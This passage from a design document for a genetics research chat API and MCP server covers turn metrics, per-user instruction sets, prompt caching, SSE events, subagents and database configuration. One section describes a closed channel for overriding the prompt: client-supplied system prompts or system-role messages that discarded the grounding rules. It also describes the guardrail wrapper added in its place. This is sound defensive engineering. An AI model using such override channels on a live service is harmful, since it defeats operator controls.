  convention, so without an owner on the row any authenticated user could send another user's
  `message_id` and have their turn overwrite that user's row — cost zeroed, `session_id`
  reassigned, no error and no log. The row therefore carries the authenticated user, and the
  `DO UPDATE` ends in `WHERE chat_turn_metrics.user_id IS excluded.user_id`. A conflicting write
  from a different user **inserts nothing, overwrites nothing, and logs a warning**;
  `record_turn_metrics` returns `None` rather than a row id. `IS` and not `=` so a deployment
  with auth disabled, writing NULL `user_id`, can still re-record its own rows. `user_id` is also
  what makes per-user cost analysis possible at all.
- **Turn-1 rows are orphaned.** The browser does not send `message_id` today and creates the
  session only after the first exchange, so *every* conversation's opening turn is written with
  both ids NULL. Consequences, until the browser change lands (tracked in the browser repo):
  per-session analysis systematically omits every conversation's first turn — usually its most
  cache-expensive — and `WHERE session_id = ?` alone cannot find those rows to delete them.
  `delete_session` therefore also deletes `user_id = ? AND session_id IS NULL AND message_id IS
  NULL`. Those rows are unattributable to any session by construction, so removing them costs no
  analysis that was possible anyway, and leaving them would keep a permanent record that the user
  held a conversation and what it cost. The trade is that deleting one conversation also drops the
  opening turns of that user's *other* conversations; privacy wins it until the ids arrive.
- **`message_id` is bounded at 64 characters** (`Field(None, max_length=64)`; uuid4 is 36). The
  service has no request-body-size middleware, and unlike `session_id` — which is only logged —
  this value is written to the shared RWO volume.
- **Secret chat writes nothing**, checked before the database is reached. Counts and costs are not
  content, but a row keyed to a session id still says a conversation happened and what it cost,
  and secret chat is promised to leave no trace.
- **Abnormal endings.** A turn stopped by `MCP_MAX_ITERATIONS` *is* recorded — that is the
  expensive tail the numbers exist to measure. A turn ended by an exception, a timeout or a client
  disconnect is not: it reaches neither the log line nor the write, and its partial accumulators
  would bias per-turn cost.
- **Failure is swallowed, and the write is off the answer's critical path.** It happens *after*
  the `done` chunk is yielded, not before: `done` carries the `message_content` the client
  persists, and an `await` ahead of it would put a SQLite busy wait (up to the 5s default,
  whenever the nightly analysis job holds the write lock) and a fresh cancellation point between
  the answer and its delivery. `chat_api`'s `event_generator` iterates the stream with a plain
  `async for` and no `break`, so the generator is driven one step past that yield and the write
  still runs. The write is also wrapped and only logged on failure: this runs inside a
  live SSE generator, and telemetry must never truncate an answer. It also runs via
  `asyncio.to_thread`, because `chat_history.db` sits on a ReadWriteOnce volume shared with the
  nightly analyze-conversations CronJob — SQLite blocks for its busy timeout when that job holds
  the write lock, and blocking the event loop would stall every other stream in the process.
- **`message_id` plumbing.** `ChatRequest.message_id` (optional) carries the id the client will
  save the assistant message under, through `stream_chat` into the row. The browser already holds
  that id before it opens the stream but does not send it yet, so today the column is written NULL
  and the row is joined to `chat_messages` by `session_id` + `created_at` ordering.

`limit` on the history endpoint is `Query(20, ge=1, le=100)`. It was unvalidated when first
written: SQLite treats a negative `LIMIT` as unbounded, so `?limit=-1` returned the entire
history, and a value past 64 bits raised `OverflowError` out of the driver as an uncaught 500.
The pre-existing `GET /chat/v1/llm-config/tool-descriptions/{tool_name}/history` had the
identical hole and now carries the same bound.

**The four legacy `/llm-config/tool-descriptions*` endpoints are admin-only** (they were
`auth_required`, including the `PUT`). A tool description is *global* and is what tells the model
when to call a tool, so one user's edit would reach every user's turns — a wider blast radius than
an instruction set, which is per-user and presentation-scoped. Nothing loads these rows into the
chat path today (`llm_service` always receives `custom_tool_descriptions=None`), so the channel
was dormant rather than live, but the gate belongs on the resource rather than on whoever
eventually wires it in. The reads moved with the write: they return `changed_by`, an admin's email
address, and a resource that is admin-to-write but world-to-read invites the write gate being read
as accidental. Note the consequence of `admin_required`: with `ENABLE_ADMIN_PAGE=false` these
routes 404 for everyone. Production sets it `true`
(`k8s/deployments/chat-backend.yaml`), and no client calls them — the browser's `llmConfigApi.ts`
only touches the comments endpoints.

### Resolution on a chat turn

`ChatRequest` gains `instruction_set_id`. **Only the id travels** — the body is loaded server-side
by `_resolve_user_instructions` (`chat_api.py`) scoped to the authenticated user, so prompt text is
never client-supplied and every answer is attributable to a stored set. An id that does not resolve
for this user, an archived set, an unavailable database, a body that is not text — every one of
them degrades to *no instructions* rather than raising. **An unknown id is ignored, never 422**,
the same rule as `verbosity`: a presentation preference must not fail a chat turn.

`ChatRequest` **has no `system_prompt` field**. It used to, with no gate and no length bound, so
any authenticated caller — any user who reaches the chat API through IAP/oauth2-proxy, or an
internal caller holding the shared `INTERNAL_API_SECRET` bearer, which `auth_required` resolves to
the identity `mcp-tool`; per-user API tokens do **not** open this path, they are validated only by
the internal-only `POST /tokens/validate` that the `/mcp` path consumes — could
replace the entire prompt for their turn and discard every grounding, citation, truncation and
out-of-scope rule, bypassing all of the care above with a field two lines away from it. The field
was removed rather than gated; nothing in the suite ever sent it. Pydantic ignores unknown keys, so
a caller still sending one is silently ignored rather than 422'd. The prompt handed to
`llm_service.stream_chat(system_prompt=...)` is always `default_system_prompt(app_name)` plus the
verbosity fragment — that parameter is the internal channel `chat_api` assembles, not an override.

The same capability had a second form: a client-sent **system-role message**. `ChatMessage.role`
was an unvalidated `str`, and `_stream_openai` forwarded the caller's messages verbatim after
prepending the server prompt, so injected text landed in a genuine system slot *after* the server's
— weaker than replacing it (the grounding rules still shipped) but the same channel. `role` is now
`Literal["user", "assistant"]`, so such a message is **422'd at the model boundary** rather than
filtered: no caller in the suite sends one, and `POST /chat/v1/chat/sessions/{id}/messages` already
rejects any other role, so failing closed is consistent and honest about what was sent. Both
provider paths additionally drop system-role messages themselves — `stream_chat` is also callable
with raw dicts, and neither path should depend on the other's validation.

The stored body is truncated to `INSTRUCTION_SET_MAX_BODY_CHARS` **before** wrapping, so the
envelope's fence is computed over the text that actually ships — a cut landing inside a backtick
run would otherwise escape it. Only the set id (and, outside secret mode, its name) is logged;
the body, which is user-authored free text, never reaches the log.

`instruction_envelope()` (`config/defaults.py`) builds the fragment: a preamble framing the text as
a *preference expressed by the user, not a rule from the system*; the body inside a fence whose
length is computed from the body's own longest backtick run; then a guardrail postamble that
**trails** the body — whatever comes last reads as the most recent instruction, so the ordering
that puts the verbosity fragment at the end inverts once arbitrary user text follows it. The
postamble restates that instructions govern presentation only (tone, audience, depth, units,
which resources to reach for, the language to answer in), never how an answer is derived or what
may be asserted, and that the rules above win on conflict.

### Two cached system blocks

`_stream_anthropic` emits `system` as two blocks, each with its own `cache_control`:

| Block | Content | Cache behaviour |
|---|---|---|
| 0 | default system prompt + verbosity fragment | identical for every user — one entry per verbosity value serves the whole user base |
| 1 | this user's instruction envelope (omitted entirely when there is none) | one small per-user entry |

Concatenating them would refragment the ~7.4K-token shared block per user per event (~$0.043)
instead of writing the small per-user block (~$0.0025); leaving the user block uncached costs
~$0.05 across a 25-iteration turn. This consumes the **fourth and last** of Anthropic's cache
breakpoints — tool definitions, the shared system block, the user system block, and the last
replayed message. **There is no spare**: anything that wants a new breakpoint has to take one of
these away.

### Where the choice is visible afterwards

`chat_messages.instruction_set_id` records the set in force per message (added by an `ALTER TABLE`
migration in `chat_history_db.py`). `add_message` writes it with
`ON CONFLICT … SET instruction_set_id = excluded.instruction_set_id`, matching the existing
semantics of `tool_profile` / `literature_backend` / `tool_results_json` — so a re-save that
**omits** the field clears it, and every client save path must send it. The admin sessions list
(`routers/admin.py`) carries `instruction_set_name`, resolved from the last message in the session
that named a set (the selector can move mid-conversation) and looked up lazily and memoized per
`(user_id, set_id)`, so a page where nobody used a set never opens the config DB. The nightly
`analyze_conversations.py` report breaks down by instruction set alongside the tool-profile
breakdown; `--llm-config-db` defaults to `llm_config.db` beside `--db` (which resolves correctly
for the CronJob, where both files sit on the same PVC) and a read failure degrades to grouping by
raw id rather than failing the run.

### Documented exclusions

- **Subagents do not receive them.** A subagent's system prompt is its skill instruction file
  (`subagent.py`), and its report is an intermediate artifact the main agent rewrites, not text
  the user reads. So "answer in Finnish" correctly produces English subagent reports and a Finnish
  final answer.
- **The standalone MCP server path does not apply them.** There is no server-side system prompt on
  that path at all — the client owns it — `_validate_user_token` (`mcp_server.py`) returns a
  bool and discards the identity behind the token, and the deployed `mcp-server` pod mounts no
  `chat-data` volume, so `llm_config.db` is not even reachable from it.
- **The OpenAI provider branch applies them too**, as one concatenated system message rather than
  two blocks: the split exists to give each half its own prompt-cache breakpoint, which that path
  has no equivalent for. Order matches Anthropic's — the envelope follows the server prompt. It
  previously dropped `user_instructions` outright with no log line, so a user with a set selected
  saw it applied in the UI while the model never received it; `provider` is client-selectable and
  `OPENAI_API_KEY` is wired into the pod, so that was reachable rather than theoretical
  (`genetics-results-suite-b3v`).

## Architecture

### Module structure

```
src/genetics_mcp_server/
├── __init__.py
├── mcp_server.py        # standalone MCP server entry point
├── mcp_client.py        # MCP client for testing
├── mcp_proxy.py         # proxy for external MCP servers
├── chat_api.py          # FastAPI chat service
├── llm_service.py       # LLM provider integration
├── logging_config.py    # GCP Cloud Logging JSON formatter
├── rate_limit.py        # per-user sliding window rate limiter
├── cost.py              # Anthropic API cost estimation
├── download_store.py    # disk-persisted download storage for TSV files
├── config/
│   ├── __init__.py
│   ├── settings.py      # configuration dataclass
│   └── defaults.py      # default prompts and values
├── tools/
│   ├── __init__.py
│   ├── definitions.py   # tool definitions (shared)
│   ├── executor.py      # tool execution via HTTP
│   ├── sql_safety.py    # allow-list validation of values spliced into server-built SQL
│   ├── uniprot.py       # UniProtKB / EBI Proteins API client (TTL cache, accession/symbol resolution)
│   └── phewas_categories.py  # PheWAS plot category mappings
├── sdk/                    # importable `genetics` data SDK (thin layer over ToolExecutor)
│   ├── __init__.py      # sync module-level functions, shared client lifecycle
│   ├── client.py        # GeneticsClient: one async method per data product
│   ├── _runner.py       # background event loop backing the sync facade
│   └── errors.py        # GeneticsError / GeneticsUsageError
├── subagent.py             # parallel subagent service
├── scripts/
│   ├── analyze_variants.py # standalone variant list analysis CLI
│   ├── analyze_conversations.py # conversation history analysis and eval extraction
│   ├── analysis_timeseries.py  # shared rolling-window aggregation used by both renderers
│   ├── plot_conversation_scores.py # time-series plots of quality over time (from metrics.json)
│   ├── backfill_metrics_dates.py # one-off: join session created_at into an older metrics.json
│   ├── replay_benchmark.py  # paired A/B replay of recorded conversations through /chat/v1/chat
│   └── conversation_prompts.py  # LLM prompt templates for topic categorization
├── skills/
│   ├── __init__.py
│   ├── definitions.py      # skill definitions and registry
│   ├── sandbox_tools.py    # file read and script execution tools
│   └── instructions/       # markdown instruction files per skill
├── auth/
│   ├── __init__.py
│   ├── core.py          # IAP/oauth2-proxy header extraction
│   └── dependencies.py  # FastAPI auth dependencies
├── db/
│   ├── __init__.py
│   ├── singleton.py     # async DB singleton base
│   ├── llm_config_db.py    # user LLM config storage
│   └── chat_history_db.py  # conversation persistence
└── routers/
    ├── __init__.py
    ├── admin.py         # admin page: all conversations, analytics
    ├── api_tokens.py    # per-user API token management
    ├── llm_config.py    # LLM config API endpoints
    └── chat_history.py  # chat history API endpoints
```

### Data flow

1. **MCP Server mode**: Client → FastMCP → ToolExecutor → Genetics API
2. **Chat API mode**: HTTP → FastAPI → LLMService → Anthropic/OpenAI → ToolExecutor → Genetics API
3. **Subagent mode**: Main Agent → `launch_subagents` tool → SubagentService → parallel Claude API calls → ToolExecutor/External Tools → results aggregated back to main agent
4. **SDK mode**: script → `genetics_mcp_server.sdk` → GeneticsClient → ToolExecutor → Genetics API / BigQuery. Same executor, different entry point: no tool schema, no context row cap, polars frames instead of result envelopes.

### Turn termination and truncation

`_stream_anthropic()` decides whether to keep looping from three signals, not one:

- **`tool_use` blocks present** — execute the tools and continue the loop, as before.
- **`stop_reason == "max_tokens"` with no tool_use blocks** — the turn was cut off by the
  output cap. The partial assistant turn is fed back followed by a user turn asking it to
  resume (a *trailing assistant* message would be a prefill, which Opus 4.6+ rejects), up
  to `MAX_CONTINUATIONS` times. Only if it is still truncated after that does the stream
  append a visible "cut short by the output token limit" notice.
- **`stop_reason == "end_turn"`, no tool_use blocks, no tool ran all turn, and the text
  presents unfilled results** — the model announced a query it never made and tabled up
  placeholders in place of the answer. Resumed the same way with
  `CONTINUE_UNFILLED_PROMPT`, sharing the `MAX_CONTINUATIONS` budget; if it keeps coming
  back unfilled, a "results above were left unfilled" notice is appended.

`_has_unfilled_output()` decides the third case from the artifact — placeholder cells such
as `*[from query]*`, or a column-label header with no data under it — never from "let me
pull the rows" phrasing. Over the stored chat history the phrasing fires on five times as
many turns, mostly ones that correctly stop to wait for the user ("paste your gene list and
I'll run it"), where resuming would answer on the user's behalf. Markdown links count as
data (citation tables are full of them), and a two-column header-only table is left alone
because that is also how a single labelled value is written (`| Result | 0 rows |`). The
system prompt carries the matching rule against presenting output that was never retrieved;
the loop guard is the backstop for when the model writes one anyway.

This matters because `max_tokens` bounds thinking *and* visible text together, so a
reasoning-heavy turn can exhaust the budget mid-sentence. Ignoring `stop_reason` made that
indistinguishable from a completed answer: the loop broke, `done` was emitted, and the
client persisted a truncated response with no error and no marker.

Both loops send the same continuation instruction for the `max_tokens` case,
`CONTINUE_TRUNCATED_PROMPT` in `config/defaults.py`. The unfilled-results guard is chat-only:
a subagent's report goes back to the main agent, which can challenge it, rather than to a
user reading a table.

`thinking` is set explicitly to `{"type": "adaptive", "display": "summarized"}` for models
that support it (`model_supports_adaptive_thinking()` in `settings.py`; the 4.6 generation
and later) rather than relying on per-model defaults — Opus 5 thinks when the parameter is
unset while 4.8/4.7 do not, so leaving it off makes the token budget depend on which model
happens to be configured. Thinking blocks are streamed as keepalives but deliberately not
persisted in `message_content`: they are only replayable to the model that produced them.

Short structured calls go the other way and turn thinking **off**: session-title
generation (`routers/chat_history.py`) and every `analyze_conversations.py` call
produce a title or a JSON object, so reasoning would only eat the token budget — a
50-token title has no room for it. `model_rejects_disabled_thinking()` guards the
opt-out, since Fable and Mythos always think and 400 on `{"type": "disabled"}`.
Responses on those paths are read by concatenating `text` blocks, never
`content[0]`, which on a thinking-capable model is a `ThinkingBlock` with no
`.text` — that mismatch is what broke the nightly analysis job on Opus 5.

### SSE event types

The chat API streams responses as Server-Sent Events (SSE). Each event is a JSON object with a `type` field:

| Event type | Description | Key payload fields |
|------------|-------------|--------------------|
| `content` | Streamed text token from the LLM response | `content` (string) |
| `thinking` | Keepalive emitted while the model reasons. Carries no reasoning content — thinking deltas do not reach the text stream, so without this tick a long reasoning phase reads as a stalled connection to the client's inactivity timeout. Rate-limited to one per 10s | none |
| `usage` | Context usage snapshot after each agentic loop iteration | `iteration`, `input_tokens`, `cache_read`, `cache_create`, `output_tokens`, `total_input_tokens`, `total_output_tokens`, `context_window`, `context_percent` |
| `image` | Base64-encoded image (e.g., PheWAS plot) | `content` (base64 string) |
| `error` | Error message from the backend | `content` (error string) |
| `done` | Signals the stream is complete | `message_content` (assistant text + `tool_use` blocks for persistence), `tool_results` (the `tool_result` blocks for this turn, for persistence) |

The `usage` event is emitted by `_stream_anthropic()` in `llm_service.py` after token accounting in each iteration of the agentic loop. It is yielded as a `StreamChunk(type="usage")` with a JSON-serialized payload. The `event_generator()` in `chat_api.py` forwards it as an SSE event, spreading the usage fields into the top-level payload alongside `"type": "usage"`.

Payload fields for `usage`. Every token count is for the **current** API call unless its
name says `total_`:
- `iteration` — current agentic loop iteration number
- `input_tokens` — the **whole context** sent in this call, i.e. Anthropic's
  `input_tokens + cache_read_input_tokens + cache_creation_input_tokens`. It is **not**
  the billed uncached input, and it is not comparable to `total_input_tokens`, which
  accumulates only the uncached part. Named for what the frontend meter renders; its
  meaning is deliberately frozen (`genetics-results-suite-n3p`)
- `cache_read` — the part of `input_tokens` served from the prompt cache
- `cache_create` — the part of `input_tokens` written into the prompt cache. Kept apart
  from `cache_read` because the two differ by more than 12x in price, so folding them
  together makes an exact cost underivable
- `output_tokens` — output tokens generated in this call
- `total_input_tokens` — cumulative **billed uncached** input across all iterations so
  far, i.e. the running sum of `input_tokens - cache_read - cache_create`
- `total_output_tokens` — cumulative output tokens across all iterations
- `context_window` — total context window size for the model (from `get_context_window()`)
- `context_percent` — percentage of the context window this call filled
  (`input_tokens / context_window * 100`)

A consumer can therefore price **the main agentic loop's Anthropic API calls** exactly
from the stream alone, with no `chat_turn_metrics` row: uncached input is
`input_tokens - cache_read - cache_create`, and the three components go to
`estimate_cost()` unchanged. This matters because secret chat — which every
replay-benchmark request uses — writes no metrics row at all.

That is not the same as pricing the whole turn. Four things sit outside the sum, and the
first two sit outside the `chat_turn_metrics` row as well, so the stream and the row
agree with each other while both understate what was billed:

- **Subagent calls.** `subagent.py` issues its own `messages.create` and keeps private
  token counters; `_stream_anthropic()` accumulates only `iter_cost` into `total_cost`.
  A turn that calls `launch_subagents` costs strictly more than either source reports.
- **Retried attempts.** A mid-stream overload/529 is retried in place, and only the
  succeeding attempt's `message.usage` is ever read. Tokens burned by the abandoned
  attempts are billed and invisible.
- **The OpenAI path emits no `usage` chunk at all.** `_stream_openai()` yields text and
  `done` only, so this whole section is Anthropic-path-only. `replay_benchmark.py`
  handles that case with a `no_usage_chunks` status rather than a zero.
- **The stream carries no model name.** `estimate_cost()` falls back to Sonnet pricing
  for anything unrecognised (`has_pricing()` exists so callers can refuse instead), so
  the consumer must learn the model out-of-band and pass it in.

The frontend uses `usage` events to render a live progress bar showing how much of the model's context window has been consumed during the conversation.

### Tool execution

Tools are defined once in `tools/definitions.py` with:
- Name and description
- Parameter schemas (type, required, defaults)
- Registration helpers for both FastMCP and Anthropic formats

The `ToolExecutor` class implements each tool as an async method that:
1. Builds the request to the genetics API
2. Handles errors and 404 responses gracefully
3. Optionally summarizes large result sets
4. Returns structured JSON with `success` flag

### External MCP proxying

The `mcp_proxy.py` module allows connecting to remote MCP servers:
1. Fetches tool definitions via JSON-RPC initialize/tools/list
2. Dynamically creates wrapper functions using exec()
3. Forwards tool calls to the remote server
4. Parses SSE responses and extracts JSON-RPC results

### Subagent system

The subagent system enables the main agent to launch parallel specialized agents for complex queries. When enabled, the main agent has access to a `launch_subagents` tool that dispatches tasks to specialized subagents.

**Skills** define subagent capabilities:
- `genetics_data_extraction` — API tools for GWAS, QTL, credible sets, etc.
- `literature_review` — scientific literature and web search
- `database_analysis` — complex SQL queries against the genetics database
- `variant_list_analysis` — analyze multiple variants for shared patterns
- `data_analysis` — Python script execution for custom analysis and visualizations

Each skill has:
- A markdown instruction file (system prompt) in `skills/instructions/`
- Tool categories controlling which tools the subagent can use
- Configurable model, max iterations, and timeout
- Optional sandbox tools (file read, script execution)
- `include_external` flag — when `True`, external MCP server tools (e.g. gnomAD, Open Targets) are appended to the subagent's tool set via `get_external_anthropic_tools()`. Currently enabled for `genetics_data_extraction`.

**Recursive launch prevention**: The `launch_subagents` tool has category `orchestration`, which is included only for the main agent. Subagent tool sets explicitly exclude `launch_subagents` to prevent recursive launches.

**Advertisement gated on availability**: `launch_subagents` is advertised to the LLM only when the subagent service actually initialized (`self.subagent_service is not None`), not merely when `ENABLE_SUBAGENTS` is set. The service requires a live Anthropic client + executor in addition to the flag, so `_stream_anthropic()` adds `launch_subagents` to the effective `disabled_tools` whenever the service is absent. This single source of truth prevents the LLM from seeing a tool that would return "subagent service isn't available" on call.

**Report truncation**: the subagent loop applies the same `stop_reason` handling as the main
chat loop (see "Turn termination and truncation"). A report stopped by the output cap is
resumed up to `MAX_CONTINUATIONS` times, with the carried-over text prepended so the report
reads as one piece. If it is still incomplete, `SubagentResult.truncated` is set, a
`[TRUNCATED: ...]` marker is appended to the output, and the flag is passed through
`run_subagents()` into the tool result — so the main agent knows it is reasoning over
partial findings instead of treating a fragment as the subagent's complete answer.
`skill.max_tokens` covers thinking as well as report text.

**Cost and token tracking**: `SubagentResult` accumulates `input_tokens` and `output_tokens` across all iterations of a subagent's agentic loop. After `launch_subagents` completes, `llm_service.py` sums tokens across all subagent results and logs an aggregated cost estimate using the same `estimate_cost()` function as the main agent.

**Subagent IDs**: Each subagent receives a unique ID (`sa-1`, `sa-2`, ...) assigned sequentially when `run_subagents()` launches them. The ID appears in all log messages and progress callbacks, e.g. `Subagent 'literature_review' [sa-2] calling search_scientific_literature(query='PCSK9')`.

**Progress streaming**: Subagent progress is streamed to the user in real time via an `asyncio.Queue` bridge:
1. `SubagentService.run_subagents()` accepts an optional `progress_callback` invoked at subagent start, each tool call, completion, and failure
2. Progress messages include the subagent ID and tool call parameters formatted by `_format_tool_params()` — a helper that produces compact `(key='value', ...)` strings, truncating long values and representing complex types as `<list>`/`<dict>`
3. In `llm_service.py`, the callback puts messages onto an `asyncio.Queue`
4. The main streaming loop drains the queue, yielding each message as an SSE `StreamChunk` (displayed as italicized status text)
5. A sentinel `None` signals all subagents have finished, ending the drain loop
6. Regular tools and subagents run concurrently — regular tool tasks are gathered alongside the subagent task

**System prompt orchestration guidance**: The default system prompt (`config/defaults.py`) includes a "Subagent Orchestration" section that tells the LLM:
- When to use subagents vs direct tool calls (parallel independent tasks vs simple lookups)
- Available skills and their best use cases
- How to structure subagent tasks (self-contained questions, pass context explicitly, split by skill not entity)

**Skill instructions**: Each skill has a markdown instruction file in `skills/instructions/` that serves as the subagent's system prompt. Instructions include:
- Guidelines for structured output format (exact numbers, systematic organization)
- Error handling rules (report missing data explicitly, handle tool failures gracefully)
- Data source mapping guidance (use `list_datasets` to discover datasets, case-sensitive data types)
- Scope constraints (e.g., data extraction skills should not interpret, just organize)

**Execution flow**:
1. Main agent calls `launch_subagents` with a list of skill+query tasks
2. `SubagentService` validates skills and launches subagents in parallel via `asyncio.gather()`
3. Each subagent runs its own agentic loop (non-streaming) with Claude API
4. Progress callbacks stream status to the user via `asyncio.Queue`
5. Results (including per-subagent token counts) are collected and returned to the main agent
6. Main agent synthesizes subagent outputs into its response

**Security**:
- File access restricted to configured `SUBAGENT_ALLOWED_PATHS` directories
- Script execution gated behind `ENABLE_SCRIPT_EXECUTION` flag
- Interpreter whitelist: `python3`, `Rscript`, `bash`
- Sensitive environment variables stripped from script processes
- Per-subagent and per-script timeouts

## Configuration

All configuration is via environment variables (`.env` file supported):

### Required

| Variable | Description |
|----------|-------------|
| `GENETICS_API_URL` | Base URL of the genetics REST API |
| `BIGQUERY_API_URL` | Base URL of the BigQuery proxy API |

### Upstream service access (optional)

| Variable | Description | Default |
|----------|-------------|---------|
| `GENETICS_PUBLIC_API_URL` | Externally reachable base URL used when building download links shown to users; falls back to `GENETICS_API_URL`, which in a cluster is an internal address | `GENETICS_API_URL` |
| `INTERNAL_API_SECRET` | Shared secret sent as `Authorization: Bearer` on every call to results-api and the BigQuery proxy. Optional only for a local run against services that require no internal auth: since `genetics-results-suite-618` the **deployed** entrypoints refuse to start without it (`config.settings.require_internal_api_secret()`, called from `mcp_server.main()` on the remote transports and from `chat_api`'s lifespan when `REQUIRE_AUTH` is true), because the alternative was sending every call **anonymously** with no local signal and nothing in the far end's log to tell it apart from an authenticated one. Only attached to `ToolExecutor.client` — the separate `external_client` carries no default auth, so the secret can never leak to a third-party API such as MouseMine or myvariant.info; the pruned sandbox install holds none by design and is exempt | - |
| `CHAT_BACKEND_URL` | Base URL of the chat backend, used by the MCP server to validate per-user API tokens via `POST /v1/tokens/validate` when the two services do not share a filesystem. Authenticated with `INTERNAL_API_SECRET` | - |

### LLM providers (for chat API)

| Variable | Description | Default |
|----------|-------------|---------|
| `ANTHROPIC_API_KEY` | Anthropic API key for Claude | - |
| `OPENAI_API_KEY` | OpenAI API key | - |
| `DEFAULT_MODEL` | Default chat model | `claude-opus-5` |
| `TEMPERATURE` | Sampling temperature. Unset by default: `model_rejects_temperature()` (in `settings.py`) knows that Fable and Opus 4.7+ reject the parameter outright, so it is opt-in for the models that still accept it | unset |
| `MAX_TOKENS` | Output token ceiling per model call. Caps thinking and visible text together; only generated tokens are billed, so headroom is cheap, but one turn must still finish inside the 5-minute per-iteration timeout | `16384` |
| `MAX_CONTINUATIONS` | How many times a turn stopped by `stop_reason: max_tokens` is resumed before the truncation is reported to the user | `3` |
| `APP_NAME` | Product/brand name substituted into the assistant persona system prompt | `FinnGenie` |

### myvariant.info (optional, chat-backend only)

| Variable | Description | Default |
|----------|-------------|---------|
| `MYVARIANT_API_URL` | myvariant.info API base URL | `https://myvariant.info/v1` |

### UniProt (optional, chat-backend only)

| Variable | Description | Default |
|----------|-------------|---------|
| `UNIPROT_API_URL` | UniProt REST API base URL (entries, search, sequences) | `https://rest.uniprot.org` |
| `EBI_PROTEINS_API_URL` | EBI Proteins API base URL (protein↔genome coordinate mapping) | `https://www.ebi.ac.uk/proteins/api` |
| `UNIPROT_CACHE_TTL` | TTL in seconds for cached UniProt responses; `0` disables caching | `86400` (24 h) |

### Search tools (optional)

| Variable | Description |
|----------|-------------|
| `TAVILY_API_KEY` | Tavily API key for web search |
| `PERPLEXITY_API_KEY` | Perplexity API key for literature search |
| `LITERATURE_SEARCH_BACKEND` | Backend when the chat request carries no `literature_backend`: `perplexity` (default) or `europepmc`. The model cannot select a backend |

### Database and storage

| Variable | Description | Default |
|----------|-------------|---------|
| `LLM_CONFIG_DB` | Path to LLM config SQLite DB | `/path/to/llm_config.db` |
| `CHAT_HISTORY_DB` | Path to chat history SQLite DB | `/path/to/chat_history.db` |
| `ATTACHMENT_STORAGE_PATH` | Path for file attachment storage | `/path/to/attachments` |
| `MAX_ATTACHMENT_SIZE` | Max attachment size in bytes | `52428800` (50MB) |
| `MAX_MESSAGE_CHARS` | Max typed-text characters in a single user message (excludes attachments) | `50000` |
| `MAX_REQUEST_CHARS` | Cap on total text across **all** messages in one chat request, images excluded. Deliberately generous — replayed tool results are legitimately far larger than a typed message — so it bounds the payload rather than policing use | `2000000` |
| `MAX_MESSAGES_PER_REQUEST` | Cap on the number of messages in one chat request | `500` |
| `MAX_ATTACHMENTS_PER_MESSAGE` | Max attachment blocks (image/document/inlined data file) per message | `10` |
| `DOWNLOAD_STORAGE_PATH` | Path for tool result download files | `/mnt/disks/data/downloads` |
| `DOWNLOAD_TTL_SECONDS` | TTL for download files in seconds | `2592000` (30 days) |

**Both SQLite databases run in WAL mode**, set by `_create_connection` in `chat_history_db.py`
and `llm_config_db.py`. Under the default rollback journal a reader is refused while a write is
being applied (commit takes an EXCLUSIVE lock), and a writer's commit is refused while any
reader still holds a read transaction; WAL removes both directions. For `llm_config.db` the
mixed read+write hot path is API-token validation: `validate_api_token` runs a SELECT plus a
bookkeeping UPDATE and COMMIT on every MCP request (`mcp_server.py:_validate_user_token`, and
`routers/api_tokens.py` for the cross-pod HTTP fallback). The per-request settings,
tool-description and instruction-set reads and writes in `routers/llm_config.py` hit the same file
from the same process, as does the instruction-set lookup on every chat turn that names one. Journal mode is a property of the file, not of the connection: the pragma converts an
existing database once (preserving its contents) and is a no-op on every connection after that,
so no migration step is involved and an image without the pragma still reads the converted file.
That one-time conversion, unlike the no-op, does need the write lock and raises
`database is locked` if another connection is mid-transaction — but it runs inside
`LLMConfigDB.__init__`, before the `Singleton` metaclass publishes the instance or
`get_llm_config_db` assigns it, and a failure there is self-healing: `_llm_config_db` is left
`None`, so the next request constructs it again.
WAL leaves `-wal` and `-shm` files beside the database on the `chat-data` PVC; the backup is a
block-level GCE disk snapshot of that PVC, so they are captured with it and recovered on next
open. `synchronous` and `busy_timeout` are left at their defaults (`FULL`, 5s) in both, so
durability is unchanged — but availability on a read-only or full volume is not. The pragma is
unconditional and `_create_connection` is the connection-cache factory, so if it raises, no
connection exists at all and reads fail with it: a read-only database file or directory now
fails at `attempt to write a readonly database` during construction instead of degrading to
working reads, and a WAL database cannot be opened on a full filesystem because opening one
creates a 32 KB `-shm`. Nothing is lost — everything reads again once the volume is writable —
and that read-only condition has occurred on this PVC before (see the `CAP_DAC_OVERRIDE` note
in `genetics-results-suite/k8s/deployments/chat-backend.yaml`), but `chat_history_db.py` has
had the same property on the same PVC all along, so the service is already broken in those
scenarios. The pod itself stays `Running` and `Ready` throughout — both probes hit `/healthz`
(`chat_api.py`), which returns `{"status": "ok"}` without touching a database — so what fails is
every request that reaches SQLite, not the pod.

Reverting is a code change, not a data migration: drop the pragma and run
`PRAGMA journal_mode = DELETE` once, which checkpoints the WAL back into the database and
removes the sidecars. It needs *nothing* holding the file open, which a rolling restart does not
give you — `get_llm_config_db`/`get_chat_history_db` open the file on the first request that
touches it and cache the connection for the process lifetime, so any chat-backend pod that has
served traffic still holds it, and against a running pod the pragma raises `database is locked`
and leaves the sidecars in place. `replicas: 1` with a `Recreate` strategy only guarantees that
no two pods hold the file at once. Scale the deployment down first:

```bash
kubectl -n genetics scale deploy/chat-backend --replicas=0
# then run the pragma against /data/llm_config.db from a one-shot Job or debug pod
# that mounts the chat-data PVC, and scale back up:
kubectl -n genetics scale deploy/chat-backend --replicas=1
```

For `llm_config.db` a scaled-down chat-backend is the only holder. `chat_history.db` has a
second one: the `analyze-conversations` CronJob
(`genetics-results-suite/k8s/deployments/analyze-conversations-cronjob.yaml`) mounts the same
PVC read-write and opens that database nightly at 02:30, so suspend it as well before reverting
that file. A collision only makes the pragma fail loudly; it does not corrupt anything.

**Which version of a config row is "current", and how its timestamp is read.** The
tool-description and user-setting tables in `llm_config.db` are append-only histories, and
`changed_at` is `CURRENT_TIMESTAMP` with one-second resolution, so two saves to the same key
inside one second tie on it. The winner is the `(changed_at, id)` maximum in every accessor —
`id` is an AUTOINCREMENT sequence, so it orders tied rows by the order they were written — which
is why the singular reads order by `changed_at DESC, id DESC` and the plural ones take `MAX(id)`
within the `MAX(changed_at)` group. No timestamp column in the file carries `NOT NULL` or a
format check, so a row written by a migration or a manual fix can hold a NULL or an unparseable
string. Such a stamp degrades to the epoch (`_as_utc_or_epoch`) rather than raising: these are
admin and config reads behind `routers/llm_config.py`, and one unusable row must not 500 a whole
listing. (A chat turn does not reach them — it takes its verbosity off the request body.) The
plural queries join on `IS` rather than `=`, so a key whose rows are *all* unstamped still
resolves to its `MAX(id)` row — the row the singular accessor returns for it — instead of
